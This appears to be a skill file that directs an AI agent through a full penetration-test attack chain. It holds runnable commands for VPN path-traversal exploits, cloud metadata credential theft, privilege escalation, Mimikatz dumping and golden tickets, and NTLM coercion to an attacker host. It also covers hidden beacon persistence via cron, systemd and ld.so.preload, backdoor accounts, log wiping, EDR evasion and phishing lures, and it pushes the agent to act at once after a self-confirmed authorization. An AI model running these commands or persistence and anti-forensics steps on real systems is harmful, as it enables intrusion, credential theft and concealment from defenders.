---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: read `../field-journal/precedent-pentest.md` — confirm this skill's operations are authorized routine work
2. `NOW`: **create/update case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` MUST NOT ACT
3. `NOW`: plan stages as **lead** (`../ops/role-map.md`) and write specialist_roles
4. `NEXT`: read `../tool-index.md` and `../../TOOLS.md`; verify tool availability and real paths
5. `NEXT`: if a tool is missing, call bootstrap; do not guess paths
6. `ACT`: pass stage gates in `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each stage (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. End: `docs-generator` report MUST include the Evidence chain

> Lead for multi-stage attack-path planning and execution. When the task needs a full "from A to B" chain, this Skill orchestrates stages, coordinates child Skills, and plans the path.
> Not red-team-only — any pentest that spans stages starts here.

---

## When to route here

These scenes **MUST** pass this Skill for full-chain planning, then dispatch to child Skills:

| Scene | Why orchestrate |
|------|--------------|
| "Do a full pentest" | Need recon-to-report full flow |
| "From internet to DC" | Boundary breach → priv-esc → lateral → AD, multiple stages |
| "HW red/blue drill" | Full attack chain + stealth + cleanup |
| "Assess this target's attack surface" | Multi-dimension recon + path planning |
| "I have a webshell, what's next" | Plan onward path from current foothold |
| "Plan an attack path" | Explicit path orchestration |
| "How far can this vuln go" | Assess chained exploit value |
| "Bug Bounty continuous monitor" | Automated multi-stage flow |
| "Full intranet pentest" | Lateral + priv-esc + domain attack combo |
| "Near-source pentest plan" | Physical access + intranet combo |
| "Supply-chain attack path" | Cross-org multi-hop |
| "Phish + post-ex" | Initial access + follow-on combo |

**Single-stage tasks skip this Skill**:
- Port scan only → go to `pentest-tools/`
- SQLi only → go to `pentest-tools/`
- APK reverse only → go to `apk-reverse/`
- Domain pentest only → go to `windows-ad/SKILL.md`

---

## Orchestration principles

### This Skill's role

```
User submits a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ plan attack path, stage order
    ↓ assess tools and methods per stage
    ↓
Dispatch to child Skills:
    ├── pentest-tools/     → tool calls, exploit
    ├── apk-reverse/       → mobile pentest
    ├── js-reverse/        → web frontend breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse
    └── browser-automation/ → automation
    ↓
After each stage, return here to assess next
    ↓
All done → docs-generator report
```

### Path-planning decision tree

```
After receiving the target:
1. What is the target? (Web/intranet/cloud/mobile/IoT)
2. What do we have? (external view/existing creds/existing foothold)
3. What is the end goal? (DC/data/specific system/prove impact)
4. Constraints? (time/stealth/untouchable systems)
    ↓
Plan the shortest path from the above
    ↓
Path blocked → return here and replan an alternate
```

---

## Full attack-chain stages

---

## 1. Reconnaissance

### 1.1 Enterprise digital-asset mapping

```bash
# subsidiary-related domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# merge and unique
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# liveness probe
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# port scan (top/full)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Use Qichacha/Tianyancha for subsidiary lists; expand attack surface
- Watch test envs (test., dev., staging.) and newly launched systems
- Certificate Transparency (crt.sh) for hidden domains

### 1.2 Sensitive-info leak hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud AK/SK (Aliyun, AWS, Azure)
- DB connection strings
- JWT secrets
- Internal API docs
- VPN/bastion creds

### 1.3 Employee profiling

**Social-engineering dictionary rules**:
```
{name_pinyin}{year}            → zhangsan2024
{name_initials}{dept_abbrev}   → zs_dev
{emp_id}@{domain}              → 10086@target.com
{name}{common_suffix}          → zhangsan@123, zhangsan!@#
```

**Sources**:
- Maimai/LinkedIn org charts
- Corporate WeChat/official-site team pages
- Job posts (stack exposure)
- Academic papers (email exposure)

### 1.4 Tech-stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# specific framework probe
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS ID
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Initial Access

### 2.1 Web vuln exploit (high-frequency breach)

| Vuln type | Detect tool | Exploit path |
|---------|---------|---------|
| SQLi | sqlmap | Data extract → write shell → OS command |
| SSTI | sstimap | Template inject → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Intranet probe → cloud metadata → AK/SK |
| Unauth access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijack |

```bash
# automated SQLi
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detect
sstimap -u "https://target.com/search?q=test"

# Nuclei bulk scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply-chain attack

**Attack path**:
1. Identify third-party components/vendors the target uses
2. Attack the vendor for code-sign / update-push rights
3. Deliver malicious payload via the legitimate update channel

**Common entries**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Contractor permission abuse
- Shared IT-vendor lateral

### 2.3 Phishing

**Email phish**:
```
Subject templates (CN samples):
- [紧急] VPN 证书即将过期，请立即更新
- [IT通知] 邮箱存储空间不足，请清理
- [HR] 2024年度绩效考核结果查询
- [财务] 报销系统升级，请重新登录确认
```

**Payload types**:
- Office macro docs (.docm/.xlsm)
- LNK shortcuts (fake PDF)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phish** (2025 trend):
- Craft a malicious OAuth app requesting permissions
- After user consent, get mail/file access
- No password; bypass MFA

### 2.4 Near-source (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard inject → reverse shell |
| Malicious power bank | O.MG Cable | Fake cable, implant backdoor |
| WiFi phish | Fluxion / WiFi Pineapple | Fake AP → cred capture |
| RFID clone | Proxmark3 | Badge clone → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent intranet access |

```bash
# Fluxion WiFi phish
fluxion  # interactive pick target AP → fake hotspot → capture WPA password

# BadUSB + Cobalt Strike
# USB-inject PowerShell downloader → beacon C2
```

### 2.5 VPN/remote-access breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# generic: password spray
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud-service breach

```bash
# AWS S3 bucket enum
aws s3 ls s3://target-bucket --no-sign-request

# cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spray
# use MSOLSpray / Spray
```

---

## 3. Privilege Escalation

### 3.1 Windows priv-esc

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vuln | Unpatched | watson / wesng detect |
| Service-path hijack | Unquoted service path | PowerUp |
| DLL hijack | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry config | msiexec install malicious MSI |
| Scheduled task | Writable task script | schtasks replace |

```powershell
# detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato priv-esc
.\GodPotato.exe -cmd "cmd /c whoami"

# automated detect
.\winPEAS.exe
```

### 3.2 Linux priv-esc

```bash
# SUID detect
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# common exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim priv-esc
sudo vim -c ':!/bin/bash'

# sudo find priv-esc
sudo find / -exec /bin/bash \;

# kernel vuln
uname -r  # check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# automated detect
./linpeas.sh
```

### 3.3 Database priv-esc

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF priv-esc
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud priv-esc

```bash
# AWS IAM enum
aws iam list-attached-user-policies --user-name compromised-user
# look for iam:PassRole + lambda:CreateFunction → admin

# Azure AD
# Global Admin → control all subscriptions
# Application Admin → add creds to service principal
```

---

## 4. Lateral Movement

### 4.1 Credential harvest

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux creds
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash extract
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealth lateral techniques

```bash
# WMI fileless exec
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote exec
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunnel (Linux)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forward
```

### 4.4 NTLM Relay

```bash
# disable Responder SMB/HTTP
# edit Responder.conf: SMB = Off, HTTP = Off

# start Responder capture
responder -I eth0

# NTLM Relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced auth
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack paths

```bash
# BloodHound data collect
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# common attack paths:
# 1. user → GenericAll → target user → reset password
# 2. user → WriteDacl → target OU → add rights
# 3. computer → constrained delegation → impersonate any user
# 4. user → DCSync rights → dump all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence

### 5.1 Windows persistence

| Technique | Stealth | Detect difficulty |
|------|:---:|:---:|
| Scheduled task | Med | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijack | High | Med |
| Shadow account | Med | Med |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# edit registry F value to clone RID
```

### 5.2 Linux persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijack
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# edit pam_unix.so to add a master password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud persistence

```bash
# AWS Lambda backdoor
# create a scheduled Lambda that callbacks C2

# Azure AD app registration
# create app → add key creds → grant Graph API permissions

# container backdoor
# modify base image → every new container ships the backdoor
```

---

## 6. EDR/AV evasion

### 6.1 Core bypass ideas

| Layer | Technique | Notes |
|------|------|------|
| Static detect | Encrypt/obfuscate/custom loader | Avoid signature match |
| Behavior detect | Indirect syscall/Unhooking | Bypass API Hook |
| Memory detect | Module stomping/heap encrypt | Avoid memory scan |
| Network detect | Domain fronting/legit-service tunnel | Blend into normal traffic |
| Log detect | ETW Patching/log clear | Reduce traces |

### 6.2 Practical bypass techniques

```
1. Custom shellcode loader (do not use public tools)
2. Direct syscalls (bypass ntdll hook)
3. Inject into low-monitor processes (e.g. RuntimeBroker.exe)
4. C2 over HTTPS + domain fronting / Cloudflare Workers
5. In-memory exec, no disk (Fileless)
6. Load via legitimately signed programs (LOLBins)
```

### 6.3 C2 framework choice

| Framework | Traits | Fit |
|------|------|---------|
| Cobalt Strike | Mature, team collab | Large red-team ops |
| Sliver | Open source, Go | Limited budget |
| Havoc | Modern, modular | Need customization |
| Mythic | Multi-agent | Cross-platform |
| AdaptixC2 | In Kali 2026.1 | Fast deploy |

---

## 7. Anti-Forensics

```bash
# Windows log clear
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clear
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# timestamp modify
touch -t 202301010000 /path/to/file

# memory cleanup
# ensure Mimikatz dump is deleted
# ensure C2 beacon has exited
# ensure temp files are cleared
```

---

## Red-team iron rules

### Three bottom lines

1. **All ops MUST obtain written authorization**
2. **Data exfil MUST be anonymized**
3. **Clean all attack traces (including memory-resident)**

### Op discipline

- Assess risk (low/med/high/critical) before each action
- Notify the PM before high-risk ops
- Keep op logs (time, action, result)
- Report high-severity vulns immediately; do not widen exploit
- Do not hurt business availability (MUST NOT DoS)
- Do not access/download real user data

### Typical failure cases

| Failure | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team traces full path | Clean immediately after op |
| C2 domain tagged by threat intel | First connect blocked | New-reg domain + domain fronting |
| Phish email trips DLP | Blue team early warn | Test mail-gateway rules |
| Lateral hits honeypot | Intent exposed | ID honeypots before acting |

---

## Tool cheat sheet

### Recon
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploit
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Priv-esc
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near-source
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relation to other skills in this pack

| Need | Route to |
|------|--------|
| Deep web vuln exploit | `pentest-tools/SKILL.md` |
| Intranet AD attack detail | `windows-ad/SKILL.md` |
| Reverse malware sample | `reverse-engineering/SKILL.md` |
| APK reverse (mobile pentest) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated swarm pentest | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted pentest | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report | `docs-generator/SKILL.md` |
| Attack-path diagram | `diagram-generator/SKILL.md` |


## Task-complete self-check (MUST pass before claiming done)

- [ ] Did I execute every workflow step (not only read)?
- [ ] Did I use real tool paths from `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/report)?
- [ ] Did I complete and write back the RULES Checklist items?
